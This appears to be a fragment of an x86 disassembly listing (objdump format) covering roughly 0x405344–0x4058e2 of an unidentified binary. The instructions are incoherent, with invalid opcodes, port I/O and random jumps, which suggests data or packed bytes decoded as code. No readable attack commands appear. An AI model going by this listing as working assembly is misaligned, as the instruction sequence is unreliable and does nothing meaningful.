  405344:	32 02                	xor    (%edx),%al
  405346:	d0 9b 24 0f c8 2a    	rcrb   $1,0x2ac80f24(%ebx)
  40534c:	b1 df                	mov    $0xdf,%cl
  40534e:	b5 04                	mov    $0x4,%ch
  405350:	e1 14                	loope  0x405366
  405352:	c4 49 89             	les    -0x77(%ecx),%ecx
  405355:	b2 94                	mov    $0x94,%dl
  405357:	18 95 13 b0 69 65    	sbb    %dl,0x6569b013(%ebp)
  40535d:	c0 9c 43 62 cb 5c 2d 	rcrb   $0x26,0x2d5ccb62(%ebx,%eax,2)
  405364:	26 
  405365:	9d                   	popf
  405366:	5e                   	pop    %esi
  405367:	d5 c9                	aad    $0xc9
  405369:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40536a:	a9 42 24 77 f5       	test   $0xf5772442,%eax
  40536f:	c3                   	ret
  405370:	d7                   	xlat   %ds:(%ebx)
  405371:	9b                   	fwait
  405372:	70 c6                	jo     0x40533a
  405374:	ba 72 d9 87 7c       	mov    $0x7c87d972,%edx
  405379:	79 f0                	jns    0x40536b
  40537b:	ef                   	out    %eax,(%dx)
  40537c:	bc 2d e3 e6 a2       	mov    $0xa2e6e32d,%esp
  405381:	86 88 1f 0d 40 f4    	xchg   %cl,-0xbbff2e1(%eax)
  405387:	22 7c a1 87          	and    -0x79(%ecx,%eiz,4),%bh
  40538b:	09 b3 c0 fc a8 b0    	or     %esi,-0x4f570340(%ebx)
  405391:	9b                   	fwait
  405392:	05 4e 28 a1 36       	add    $0x36a1284e,%eax
  405397:	e6 ce                	out    %al,$0xce
  405399:	8d 63 46             	lea    0x46(%ebx),%esp
  40539c:	56                   	push   %esi
  40539d:	93                   	xchg   %eax,%ebx
  40539e:	8b 03                	mov    (%ebx),%eax
  4053a0:	e6 24                	out    %al,$0x24
  4053a2:	c1 85 f9 87 d7 5a 65 	roll   $0x65,0x5ad787f9(%ebp)
  4053a9:	73 b7                	jae    0x405362
  4053ab:	5b                   	pop    %ebx
  4053ac:	82 70 c0 50          	xorb   $0x50,-0x40(%eax)
  4053b0:	31 51 0a             	xor    %edx,0xa(%ecx)
  4053b3:	54                   	push   %esp
  4053b4:	99                   	cltd
  4053b5:	b2 f4                	mov    $0xf4,%dl
  4053b7:	6a 58                	push   $0x58
  4053b9:	a2 65 ad 87 48       	mov    %al,0x4887ad65
  4053be:	00 5b 50             	add    %bl,0x50(%ebx)
  4053c1:	cd 71                	int    $0x71
  4053c3:	da 3f                	fidivrl (%edi)
  4053c5:	8d 81 33 1f 6b 11    	lea    0x116b1f33(%ecx),%eax
  4053cb:	9a a0 5f c4 3c 76 42 	lcall  $0x4276,$0x3cc45fa0
  4053d2:	b6 20                	mov    $0x20,%dh
  4053d4:	93                   	xchg   %eax,%ebx
  4053d5:	09 d5                	or     %edx,%ebp
  4053d7:	87 73 5d             	xchg   %esi,0x5d(%ebx)
  4053da:	11 0d 2b ce a5 95    	adc    %ecx,0x95a5ce2b
  4053e0:	e5 af                	in     $0xaf,%eax
  4053e2:	15 35 73 92 7a       	adc    $0x7a927335,%eax
  4053e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053e8:	f4                   	hlt
  4053e9:	40                   	inc    %eax
  4053ea:	2f                   	das
  4053eb:	0f cc                	bswap  %esp
  4053ed:	3a 0c 80             	cmp    (%eax,%eax,4),%cl
  4053f0:	f8                   	clc
  4053f1:	96                   	xchg   %eax,%esi
  4053f2:	57                   	push   %edi
  4053f3:	50                   	push   %eax
  4053f4:	94                   	xchg   %eax,%esp
  4053f5:	d0 19                	rcrb   $1,(%ecx)
  4053f7:	66 30 61 4a          	data16 xor %ah,0x4a(%ecx)
  4053fb:	ab                   	stos   %eax,%es:(%edi)
  4053fc:	9f                   	lahf
  4053fd:	86 9c 03 50 43 c7 32 	xchg   %bl,0x32c74350(%ebx,%eax,1)
  405404:	e4 66                	in     $0x66,%al
  405406:	44                   	inc    %esp
  405407:	05 77 ec 4e 35       	add    $0x354eec77,%eax
  40540c:	27                   	daa
  40540d:	e5 be                	in     $0xbe,%eax
  40540f:	c5 01                	lds    (%ecx),%eax
  405411:	4e                   	dec    %esi
  405412:	5f                   	pop    %edi
  405413:	c0 4f 43 20          	rorb   $0x20,0x43(%edi)
  405417:	82 b7 da 8b 91 d2 ab 	xorb   $0xab,-0x2d6e7426(%edi)
  40541e:	c1 8b 46 9a d1 96 99 	rorl   $0x99,-0x692e65ba(%ebx)
  405425:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405426:	74 4a                	je     0x405472
  405428:	3b cd                	cmp    %ebp,%ecx
  40542a:	24 e8                	and    $0xe8,%al
  40542c:	5e                   	pop    %esi
  40542d:	b4 8c                	mov    $0x8c,%ah
  40542f:	d3 9f a8 ae de cf    	rcrl   %cl,-0x30215158(%edi)
  405435:	c6                   	(bad)
  405436:	c8 e8 31 25          	enter  $0x31e8,$0x25
  40543a:	74 28                	je     0x405464
  40543c:	41                   	inc    %ecx
  40543d:	91                   	xchg   %eax,%ecx
  40543e:	6f                   	outsl  %ds:(%esi),(%dx)
  40543f:	24 41                	and    $0x41,%al
  405441:	28 66 c1             	sub    %ah,-0x3f(%esi)
  405444:	2a f8                	sub    %al,%bh
  405446:	e0 43                	loopne 0x40548b
  405448:	5f                   	pop    %edi
  405449:	6e                   	outsb  %ds:(%esi),(%dx)
  40544a:	de d8                	(bad)
  40544c:	26 0f 27             	es (bad)
  40544f:	dc a4 c7 5a e0 b7 6b 	fsubl  0x6bb7e05a(%edi,%eax,8)
  405456:	28 55 e8             	sub    %dl,-0x18(%ebp)
  405459:	d4 33                	aam    $0x33
  40545b:	8d 79 4b             	lea    0x4b(%ecx),%edi
  40545e:	da c9                	fcmove %st(1),%st
  405460:	dd c6                	ffree  %st(6)
  405462:	42                   	inc    %edx
  405463:	2c 06                	sub    $0x6,%al
  405465:	1b 6e 1e             	sbb    0x1e(%esi),%ebp
  405468:	43                   	inc    %ebx
  405469:	79 c7                	jns    0x405432
  40546b:	8d 59 aa             	lea    -0x56(%ecx),%ebx
  40546e:	59                   	pop    %ecx
  40546f:	f4                   	hlt
  405470:	43                   	inc    %ebx
  405471:	fb                   	sti
  405472:	61                   	popa
  405473:	56                   	push   %esi
  405474:	b7 69                	mov    $0x69,%bh
  405476:	2e 10 11             	adc    %dl,%cs:(%ecx)
  405479:	5a                   	pop    %edx
  40547a:	d3 25 1a 55 63 27    	shll   %cl,0x2763551a
  405480:	25 84 9b 4a 6e       	and    $0x6e4a9b84,%eax
  405485:	c9                   	leave
  405486:	8f 05 ed 7f 00 b2    	pop    0xb2007fed
  40548c:	95                   	xchg   %eax,%ebp
  40548d:	8e da                	mov    %edx,%ds
  40548f:	cc                   	int3
  405490:	96                   	xchg   %eax,%esi
  405491:	01 27                	add    %esp,(%edi)
  405493:	d4 30                	aam    $0x30
  405495:	7c a1                	jl     0x405438
  405497:	46                   	inc    %esi
  405498:	c4 99 48 93 84 67    	les    0x67849348(%ecx),%ebx
  40549e:	b5 86                	mov    $0x86,%ch
  4054a0:	85 a7 6c c2 d7 50    	test   %esp,0x50d7c26c(%edi)
  4054a6:	e8 69 9b 1d 07       	call   0x75df014
  4054ab:	60                   	pusha
  4054ac:	75 df                	jne    0x40548d
  4054ae:	4b                   	dec    %ebx
  4054af:	f8                   	clc
  4054b0:	3a 37                	cmp    (%edi),%dh
  4054b2:	20 09                	and    %cl,(%ecx)
  4054b4:	f7 e5                	mul    %ebp
  4054b6:	89 cb                	mov    %ecx,%ebx
  4054b8:	0f 14 b8 59 cd af b0 	unpcklps -0x4f5032a7(%eax),%xmm7
  4054bf:	6d                   	insl   (%dx),%es:(%edi)
  4054c0:	03 6f f4             	add    -0xc(%edi),%ebp
  4054c3:	1d e0 20 06 2d       	sbb    $0x2d0620e0,%eax
  4054c8:	d0 43 ff             	rolb   $1,-0x1(%ebx)
  4054cb:	37                   	aaa
  4054cc:	ca c8 ea             	lret   $0xeac8
  4054cf:	59                   	pop    %ecx
  4054d0:	e1 6c                	loope  0x40553e
  4054d2:	d3 39                	sarl   %cl,(%ecx)
  4054d4:	19 a7 c5 73 3a 13    	sbb    %esp,0x133a73c5(%edi)
  4054da:	80 8c ef c3 8b 48 24 	orb    $0x1e,0x24488bc3(%edi,%ebp,8)
  4054e1:	1e 
  4054e2:	d0 93 62 1f 48 98    	rclb   $1,-0x67b7e09e(%ebx)
  4054e8:	d1 d8                	rcr    $1,%eax
  4054ea:	6b 8d 09 02 a4 e5 88 	imul   $0xffffff88,-0x1a5bfdf7(%ebp),%ecx
  4054f1:	df bb b4 91 36 ed    	fistpll -0x12c96e4c(%ebx)
  4054f7:	4a                   	dec    %edx
  4054f8:	d0 ef                	shr    $1,%bh
  4054fa:	ed                   	in     (%dx),%eax
  4054fb:	77 62                	ja     0x40555f
  4054fd:	ff ad 3f 4b dc 63    	ljmp   *0x63dc4b3f(%ebp)
  405503:	15 0a f4 60 fa       	adc    $0xfa60f40a,%eax
  405508:	77 9e                	ja     0x4054a8
  40550a:	3c 6a                	cmp    $0x6a,%al
  40550c:	04 1e                	add    $0x1e,%al
  40550e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40550f:	c3                   	ret
  405510:	88 0c 1f             	mov    %cl,(%edi,%ebx,1)
  405513:	f7 e0                	mul    %eax
  405515:	23 cb                	and    %ebx,%ecx
  405517:	45                   	inc    %ebp
  405518:	40                   	inc    %eax
  405519:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40551a:	b3 14                	mov    $0x14,%bl
  40551c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40551d:	fd                   	std
  40551e:	23 dd                	and    %ebp,%ebx
  405520:	ca cf ef             	lret   $0xefcf
  405523:	3c 9b                	cmp    $0x9b,%al
  405525:	38 ac b6 8f 5b ac 50 	cmp    %ch,0x50ac5b8f(%esi,%esi,4)
  40552c:	20 d0                	and    %dl,%al
  40552e:	a9 b0 1b e9 4b       	test   $0x4be91bb0,%eax
  405533:	91                   	xchg   %eax,%ecx
  405534:	f4                   	hlt
  405535:	ed                   	in     (%dx),%eax
  405536:	f7 7b 00             	idivl  0x0(%ebx)
  405539:	3d 32 b1 c6 f7       	cmp    $0xf7c6b132,%eax
  40553e:	01 56 41             	add    %edx,0x41(%esi)
  405541:	df a3 fc 9e af 60    	fbld   0x60af9efc(%ebx)
  405547:	ae                   	scas   %es:(%edi),%al
  405548:	1b 1c 63             	sbb    (%ebx,%eiz,2),%ebx
  40554b:	7a 57                	jp     0x4055a4
  40554d:	0a 9d 7b 62 74 73    	or     0x7374627b(%ebp),%bl
  405553:	65 7b 2f             	gs jnp 0x405585
  405556:	d7                   	xlat   %ds:(%ebx)
  405557:	09 1f                	or     %ebx,(%edi)
  405559:	9b                   	fwait
  40555a:	d5 27                	aad    $0x27
  40555c:	8c 8d 0c c6 59 8a    	mov    %cs,-0x75a639f4(%ebp)
  405562:	73 ac                	jae    0x405510
  405564:	f2 63 bb 33 f5 8f 6b 	repnz arpl %edi,0x6b8ff533(%ebx)
  40556b:	86 3c 76             	xchg   %bh,(%esi,%esi,2)
  40556e:	34 50                	xor    $0x50,%al
  405570:	5a                   	pop    %edx
  405571:	4f                   	dec    %edi
  405572:	79 10                	jns    0x405584
  405574:	7c a6                	jl     0x40551c
  405576:	35 8d 66 09 5b       	xor    $0x5b09668d,%eax
  40557b:	e5 cc                	in     $0xcc,%eax
  40557d:	96                   	xchg   %eax,%esi
  40557e:	c5 e6 0b             	(bad)
  405581:	fc                   	cld
  405582:	80 74 5f b5 92       	xorb   $0x92,-0x4b(%edi,%ebx,2)
  405587:	6a af                	push   $0xffffffaf
  405589:	36 fd                	ss std
  40558b:	55                   	push   %ebp
  40558c:	d3 ac e7 d3 3d 97 a1 	shrl   %cl,-0x5e68c22d(%edi,%eiz,8)
  405593:	94                   	xchg   %eax,%esp
  405594:	de 7e 71             	fidivrs 0x71(%esi)
  405597:	2d 7c 4d 1b cb       	sub    $0xcb1b4d7c,%eax
  40559c:	3c c1                	cmp    $0xc1,%al
  40559e:	38 79 4a             	cmp    %bh,0x4a(%ecx)
  4055a1:	5c                   	pop    %esp
  4055a2:	cb                   	lret
  4055a3:	42                   	inc    %edx
  4055a4:	4c                   	dec    %esp
  4055a5:	9d                   	popf
  4055a6:	7a c3                	jp     0x40556b
  4055a8:	9a 68 80 11 83 70 0c 	lcall  $0xc70,$0x83118068
  4055af:	1e                   	push   %ds
  4055b0:	52                   	push   %edx
  4055b1:	4e                   	dec    %esi
  4055b2:	1c b9                	sbb    $0xb9,%al
  4055b4:	c1 79 88 e2          	sarl   $0xe2,-0x78(%ecx)
  4055b8:	3a 56 e6             	cmp    -0x1a(%esi),%dl
  4055bb:	36 c9                	ss leave
  4055bd:	8a bd a6 91 cd 4e    	mov    0x4ecd91a6(%ebp),%bh
  4055c3:	d5 7f                	aad    $0x7f
  4055c5:	b0 ca                	mov    $0xca,%al
  4055c7:	ac                   	lods   %ds:(%esi),%al
  4055c8:	65 7d 39             	gs jge 0x405604
  4055cb:	0f b6 db             	movzbl %bl,%ebx
  4055ce:	f2 4d                	repnz dec %ebp
  4055d0:	f0 5a                	lock pop %edx
  4055d2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4055d3:	6c                   	insb   (%dx),%es:(%edi)
  4055d4:	55                   	push   %ebp
  4055d5:	a0 5a f5 6a 0c       	mov    0xc6af55a,%al
  4055da:	a8 a4                	test   $0xa4,%al
  4055dc:	fe                   	(bad)
  4055dd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4055de:	32 d9                	xor    %cl,%bl
  4055e0:	0f 13 03             	movlps %xmm0,(%ebx)
  4055e3:	af                   	scas   %es:(%edi),%eax
  4055e4:	33 8e 9c dd a6 14    	xor    0x14a6dd9c(%esi),%ecx
  4055ea:	01 d5                	add    %edx,%ebp
  4055ec:	b2 b1                	mov    $0xb1,%dl
  4055ee:	0e                   	push   %cs
  4055ef:	00 5c f1 51          	add    %bl,0x51(%ecx,%esi,8)
  4055f3:	5f                   	pop    %edi
  4055f4:	e5 91                	in     $0x91,%eax
  4055f6:	e4 2d                	in     $0x2d,%al
  4055f8:	a1 13 73 16 e0       	mov    0xe0167313,%eax
  4055fd:	99                   	cltd
  4055fe:	74 32                	je     0x405632
  405600:	d0 9b ca 7b 6a b8    	rcrb   $1,-0x47958436(%ebx)
  405606:	70 16                	jo     0x40561e
  405608:	1f                   	pop    %ds
  405609:	a2 0f 0b e6 75       	mov    %al,0x75e60b0f
  40560e:	08 0f                	or     %cl,(%edi)
  405610:	8e d0                	mov    %eax,%ss
  405612:	30 f1                	xor    %dh,%cl
  405614:	47                   	inc    %edi
  405615:	93                   	xchg   %eax,%ebx
  405616:	05 cf 95 79 c0       	add    $0xc07995cf,%eax
  40561b:	f4                   	hlt
  40561c:	66 92                	xchg   %ax,%dx
  40561e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40561f:	38 e1                	cmp    %ah,%cl
  405621:	ee                   	out    %al,(%dx)
  405622:	8a 82 f4 21 c5 fa    	mov    -0x53ade0c(%edx),%al
  405628:	c7                   	(bad)
  405629:	6d                   	insl   (%dx),%es:(%edi)
  40562a:	c6                   	(bad)
  40562b:	23 60 a1             	and    -0x5f(%eax),%esp
  40562e:	be 1c 10 ce 2f       	mov    $0x2fce101c,%esi
  405633:	07                   	pop    %es
  405634:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405635:	6e                   	outsb  %ds:(%esi),(%dx)
  405636:	35 08 6c 02 ff       	xor    $0xff026c08,%eax
  40563b:	7b cd                	jnp    0x40560a
  40563d:	38 3c 5e             	cmp    %bh,(%esi,%ebx,2)
  405640:	8f                   	(bad)
  405641:	59                   	pop    %ecx
  405642:	49                   	dec    %ecx
  405643:	30 d3                	xor    %dl,%bl
  405645:	8a f6                	mov    %dh,%dh
  405647:	57                   	push   %edi
  405648:	b0 bc                	mov    $0xbc,%al
  40564a:	15 a6 68 a7 b6       	adc    $0xb6a768a6,%eax
  40564f:	05 f9 5e 23 46       	add    $0x46235ef9,%eax
  405654:	05 ef 0d 05 1e       	add    $0x1e050def,%eax
  405659:	cb                   	lret
  40565a:	8d 0b                	lea    (%ebx),%ecx
  40565c:	c9                   	leave
  40565d:	3e 5d                	ds pop %ebp
  40565f:	80 df 4e             	sbb    $0x4e,%bh
  405662:	74 a2                	je     0x405606
  405664:	1c 0a                	sbb    $0xa,%al
  405666:	6e                   	outsb  %ds:(%esi),(%dx)
  405667:	24 20                	and    $0x20,%al
  405669:	1f                   	pop    %ds
  40566a:	7f 79                	jg     0x4056e5
  40566c:	b3 cf                	mov    $0xcf,%bl
  40566e:	d4 82                	aam    $0x82
  405670:	9e                   	sahf
  405671:	e1 dc                	loope  0x40564f
  405673:	b3 7f                	mov    $0x7f,%bl
  405675:	44                   	inc    %esp
  405676:	97                   	xchg   %eax,%edi
  405677:	cd a2                	int    $0xa2
  405679:	28 67 f0             	sub    %ah,-0x10(%edi)
  40567c:	40                   	inc    %eax
  40567d:	5c                   	pop    %esp
  40567e:	3c 21                	cmp    $0x21,%al
  405680:	6d                   	insl   (%dx),%es:(%edi)
  405681:	93                   	xchg   %eax,%ebx
  405682:	e7 f6                	out    %eax,$0xf6
  405684:	c2 a5 7e             	ret    $0x7ea5
  405687:	54                   	push   %esp
  405688:	68 e5 f4 c5 79       	push   $0x79c5f4e5
  40568d:	d1 aa 9a 32 e4 af    	shrl   $1,-0x501bcd66(%edx)
  405693:	ec                   	in     (%dx),%al
  405694:	8d 20                	lea    (%eax),%esp
  405696:	69 f3 7b 5e b4 58    	imul   $0x58b45e7b,%ebx,%esi
  40569c:	0d 3a 82 3c 19       	or     $0x193c823a,%eax
  4056a1:	7c d3                	jl     0x405676
  4056a3:	9b                   	fwait
  4056a4:	53                   	push   %ebx
  4056a5:	27                   	daa
  4056a6:	92                   	xchg   %eax,%edx
  4056a7:	59                   	pop    %ecx
  4056a8:	bc 78 b3 80 0b       	mov    $0xb80b378,%esp
  4056ad:	2d a6 30 e5 20       	sub    $0x20e530a6,%eax
  4056b2:	d7                   	xlat   %ds:(%ebx)
  4056b3:	96                   	xchg   %eax,%esi
  4056b4:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4056b5:	94                   	xchg   %eax,%esp
  4056b6:	46                   	inc    %esi
  4056b7:	7c 30                	jl     0x4056e9
  4056b9:	27                   	daa
  4056ba:	e2 ba                	loop   0x405676
  4056bc:	87 60 03             	xchg   %esp,0x3(%eax)
  4056bf:	4b                   	dec    %ebx
  4056c0:	20 2c f4             	and    %ch,(%esp,%esi,8)
  4056c3:	c9                   	leave
  4056c4:	38 00                	cmp    %al,(%eax)
  4056c6:	de cf                	fmulp  %st,%st(7)
  4056c8:	72 ba                	jb     0x405684
  4056ca:	ac                   	lods   %ds:(%esi),%al
  4056cb:	2d af f8 ec 70       	sub    $0x70ecf8af,%eax
  4056d0:	03 b8 ec a6 75 0e    	add    0xe75a6ec(%eax),%edi
  4056d6:	5d                   	pop    %ebp
  4056d7:	ac                   	lods   %ds:(%esi),%al
  4056d8:	16                   	push   %ss
  4056d9:	bc fc a6 77 ee       	mov    $0xee77a6fc,%esp
  4056de:	74 88                	je     0x405668
  4056e0:	8e 6c 3d 22          	mov    0x22(%ebp,%edi,1),%gs
  4056e4:	98                   	cwtl
  4056e5:	e8 ba ee db 6e       	call   0x6f1c45a4
  4056ea:	2c 6f                	sub    $0x6f,%al
  4056ec:	f6 3e                	idivb  (%esi)
  4056ee:	a2 1b 39 c5 74       	mov    %al,0x74c5391b
  4056f3:	9f                   	lahf
  4056f4:	ba 9e fd 8a 1d       	mov    $0x1d8afd9e,%edx
  4056f9:	ee                   	out    %al,(%dx)
  4056fa:	c3                   	ret
  4056fb:	49                   	dec    %ecx
  4056fc:	1b f9                	sbb    %ecx,%edi
  4056fe:	e0 49                	loopne 0x405749
  405700:	59                   	pop    %ecx
  405701:	ea 5f 49 e4 f3 a3 b1 	ljmp   $0xb1a3,$0xf3e4495f
  405708:	0e                   	push   %cs
  405709:	72 94                	jb     0x40569f
  40570b:	39 e2                	cmp    %esp,%edx
  40570d:	b2 7d                	mov    $0x7d,%dl
  40570f:	3d 66 25 01 c6       	cmp    $0xc6012566,%eax
  405714:	73 a0                	jae    0x4056b6
  405716:	89 14 02             	mov    %edx,(%edx,%eax,1)
  405719:	5c                   	pop    %esp
  40571a:	05 cf 63 1a d3       	add    $0xd31a63cf,%eax
  40571f:	9f                   	lahf
  405720:	49                   	dec    %ecx
  405721:	a1 52 5f 30 53       	mov    0x53305f52,%eax
  405726:	c1 07 cf             	roll   $0xcf,(%edi)
  405729:	8a 75 b2             	mov    -0x4e(%ebp),%dh
  40572c:	af                   	scas   %es:(%edi),%eax
  40572d:	89 67 45             	mov    %esp,0x45(%edi)
  405730:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405731:	03 00                	add    (%eax),%eax
  405733:	54                   	push   %esp
  405734:	f6 bc 7d 8f 55 28 0a 	idivb  0xa28558f(%ebp,%edi,2)
  40573b:	be 08 72 62 cd       	mov    $0xcd627208,%esi
  405740:	98                   	cwtl
  405741:	a2 cc 1f 86 93       	mov    %al,0x93861fcc
  405746:	b7 df                	mov    $0xdf,%bh
  405748:	5a                   	pop    %edx
  405749:	f1                   	int1
  40574a:	84 bf d3 b1 c6 c8    	test   %bh,-0x37394e2d(%edi)
  405750:	7b c8                	jnp    0x40571a
  405752:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405753:	8a b6 38 9a f7 65    	mov    0x65f79a38(%esi),%dh
  405759:	62                   	(bad)
  40575a:	ec                   	in     (%dx),%al
  40575b:	19 1f                	sbb    %ebx,(%edi)
  40575d:	7c ea                	jl     0x405749
  40575f:	56                   	push   %esi
  405760:	37                   	aaa
  405761:	4f                   	dec    %edi
  405762:	80 5c 88 5a 7f       	sbbb   $0x7f,0x5a(%eax,%ecx,4)
  405767:	5f                   	pop    %edi
  405768:	5a                   	pop    %edx
  405769:	a2 06 ee f4 fc       	mov    %al,0xfcf4ee06
  40576e:	91                   	xchg   %eax,%ecx
  40576f:	80 6b 65 98          	subb   $0x98,0x65(%ebx)
  405773:	3f                   	aas
  405774:	89 b0 9e 63 56 06    	mov    %esi,0x656639e(%eax)
  40577a:	44                   	inc    %esp
  40577b:	01 5c 05 d3          	add    %ebx,-0x2d(%ebp,%eax,1)
  40577f:	34 e6                	xor    $0xe6,%al
  405781:	ce                   	into
  405782:	01 42 2b             	add    %eax,0x2b(%edx)
  405785:	81 4e 5c ff 9b 12 6a 	orl    $0x6a129bff,0x5c(%esi)
  40578c:	85 4e 97             	test   %ecx,-0x69(%esi)
  40578f:	71 7f                	jno    0x405810
  405791:	5f                   	pop    %edi
  405792:	25 b3 19 58 3e       	and    $0x3e5819b3,%eax
  405797:	a1 dd 14 22 60       	mov    0x602214dd,%eax
  40579c:	b9 ce c9 89 18       	mov    $0x1889c9ce,%ecx
  4057a1:	17                   	pop    %ss
  4057a2:	3a 46 65             	cmp    0x65(%esi),%al
  4057a5:	59                   	pop    %ecx
  4057a6:	3a a8 67 54 73 eb    	cmp    -0x148cab99(%eax),%ch
  4057ac:	7c 7e                	jl     0x40582c
  4057ae:	5a                   	pop    %edx
  4057af:	ad                   	lods   %ds:(%esi),%eax
  4057b0:	2a a8 dd 61 fa 73    	sub    0x73fa61dd(%eax),%ch
  4057b6:	aa                   	stos   %al,%es:(%edi)
  4057b7:	df 30                	fbstp  (%eax)
  4057b9:	79 ef                	jns    0x4057aa
  4057bb:	1e                   	push   %ds
  4057bc:	1d 34 72 f3 25       	sbb    $0x25f37234,%eax
  4057c1:	1d 03 ea 9e de       	sbb    $0xde9eea03,%eax
  4057c6:	10 79 b2             	adc    %bh,-0x4e(%ecx)
  4057c9:	ef                   	out    %eax,(%dx)
  4057ca:	3c 0e                	cmp    $0xe,%al
  4057cc:	25 d5 09 45 18       	and    $0x184509d5,%eax
  4057d1:	ae                   	scas   %es:(%edi),%al
  4057d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4057d3:	30 2b                	xor    %ch,(%ebx)
  4057d5:	d5 d7                	aad    $0xd7
  4057d7:	b4 78                	mov    $0x78,%ah
  4057d9:	8c 7e 8c             	mov    %?,-0x74(%esi)
  4057dc:	78 30                	js     0x40580e
  4057de:	69 77 25 d0 d9 2e b2 	imul   $0xb22ed9d0,0x25(%edi),%esi
  4057e5:	0f 82 d6 14 2c af    	jb     0xaf6c6cc1
  4057eb:	87 81 5b ec ba 09    	xchg   %eax,0x9baec5b(%ecx)
  4057f1:	10 f5                	adc    %dh,%ch
  4057f3:	ce                   	into
  4057f4:	93                   	xchg   %eax,%ebx
  4057f5:	0c aa                	or     $0xaa,%al
  4057f7:	8b f1                	mov    %ecx,%esi
  4057f9:	e0 d7                	loopne 0x4057d2
  4057fb:	fd                   	std
  4057fc:	83 e2 2e             	and    $0x2e,%edx
  4057ff:	16                   	push   %ss
  405800:	af                   	scas   %es:(%edi),%eax
  405801:	9c                   	pushf
  405802:	d1 bd db ef 81 33    	sarl   $1,0x3381efdb(%ebp)
  405808:	cb                   	lret
  405809:	f1                   	int1
  40580a:	ad                   	lods   %ds:(%esi),%eax
  40580b:	1f                   	pop    %ds
  40580c:	42                   	inc    %edx
  40580d:	ff af 66 1e 63 ff    	ljmp   *-0x9ce19a(%edi)
  405813:	e7 67                	out    %eax,$0x67
  405815:	b0 f1                	mov    $0xf1,%al
  405817:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405818:	c7                   	(bad)
  405819:	13 94 12 3a 7c f3 ea 	adc    -0x150c83c6(%edx,%edx,1),%edx
  405820:	6f                   	outsl  %ds:(%esi),(%dx)
  405821:	8e 40 da             	mov    -0x26(%eax),%es
  405824:	70 df                	jo     0x405805
  405826:	5d                   	pop    %ebp
  405827:	3d 60 da 71 d3       	cmp    $0xd371da60,%eax
  40582c:	eb 34                	jmp    0x405862
  40582e:	1d 20 aa 3e 73       	sbb    $0x733eaa20,%eax
  405833:	04 01                	add    $0x1,%al
  405835:	89 93 77 fb ec 45    	mov    %edx,0x45ecfb77(%ebx)
  40583b:	02 85 cb 39 ac 7a    	add    0x7aac39cb(%ebp),%al
  405841:	dd c0                	ffree  %st(0)
  405843:	16                   	push   %ss
  405844:	bb be 6f b1 8e       	mov    $0x8eb16fbe,%ebx
  405849:	bd b6 94 1e 38       	mov    $0x381e94b6,%ebp
  40584e:	c4 77 79             	les    0x79(%edi),%esi
  405851:	8b 2f                	mov    (%edi),%ebp
  405853:	6a a8                	push   $0xffffffa8
  405855:	4b                   	dec    %ebx
  405856:	bf ed d7 18 6f       	mov    $0x6f18d7ed,%edi
  40585b:	1c 84                	sbb    $0x84,%al
  40585d:	36 12 51 76          	adc    %ss:0x76(%ecx),%dl
  405861:	1b ae f2 bc 44 84    	sbb    -0x7bbb430e(%esi),%ebp
  405867:	a3 b2 e8 e6 cb       	mov    %eax,0xcbe6e8b2
  40586c:	71 59                	jno    0x4058c7
  40586e:	fe                   	(bad)
  40586f:	76 c0                	jbe    0x405831
  405871:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405872:	3f                   	aas
  405873:	43                   	inc    %ebx
  405874:	0e                   	push   %cs
  405875:	03 43 42             	add    0x42(%ebx),%eax
  405878:	26 03 0a             	add    %es:(%edx),%ecx
  40587b:	65 c9                	gs leave
  40587d:	b1 5f                	mov    $0x5f,%cl
  40587f:	f2 ed                	repnz in (%dx),%eax
  405881:	ff 54 82 37          	call   *0x37(%edx,%eax,4)
  405885:	d4 23                	aam    $0x23
  405887:	0d b8 fd cf 8a       	or     $0x8acffdb8,%eax
  40588c:	14 3b                	adc    $0x3b,%al
  40588e:	27                   	daa
  40588f:	43                   	inc    %ebx
  405890:	56                   	push   %esi
  405891:	ef                   	out    %eax,(%dx)
  405892:	31 4f c8             	xor    %ecx,-0x38(%edi)
  405895:	5b                   	pop    %ebx
  405896:	98                   	cwtl
  405897:	39 63 ee             	cmp    %esp,-0x12(%ebx)
  40589a:	7b a1                	jnp    0x40583d
  40589c:	29 3e                	sub    %edi,(%esi)
  40589e:	5f                   	pop    %edi
  40589f:	57                   	push   %edi
  4058a0:	41                   	inc    %ecx
  4058a1:	44                   	inc    %esp
  4058a2:	47                   	inc    %edi
  4058a3:	2c d7                	sub    $0xd7,%al
  4058a5:	75 30                	jne    0x4058d7
  4058a7:	63 dc                	arpl   %ebx,%esp
  4058a9:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4058aa:	a9 84 0a 35 5e       	test   $0x5e350a84,%eax
  4058af:	71 97                	jno    0x405848
  4058b1:	76 f1                	jbe    0x4058a4
  4058b3:	fb                   	sti
  4058b4:	12 52 b7             	adc    -0x49(%edx),%dl
  4058b7:	87 1b                	xchg   %ebx,(%ebx)
  4058b9:	03 98 6a ec 7e 63    	add    0x637eec6a(%eax),%ebx
  4058bf:	46                   	inc    %esi
  4058c0:	4b                   	dec    %ebx
  4058c1:	2b 3b                	sub    (%ebx),%edi
  4058c3:	82 ee 6e             	sub    $0x6e,%dh
  4058c6:	50                   	push   %eax
  4058c7:	dd 90 ea 57 72 07    	fstl   0x77257ea(%eax)
  4058cd:	90                   	nop
  4058ce:	02 cd                	add    %ch,%cl
  4058d0:	86 8c 50 de 7b 7b b6 	xchg   %cl,-0x49848422(%eax,%edx,2)
  4058d7:	b5 ae                	mov    $0xae,%ch
  4058d9:	ec                   	in     (%dx),%al
  4058da:	4b                   	dec    %ebx
  4058db:	bb 33 d5 d6 09       	mov    $0x9d6d533,%ebx
  4058e0:	6d                   	insl   (%dx),%es:(%edi)
  4058e1:	5b                   	pop    %ebx
  4058e2:	4f                   	dec    %edi
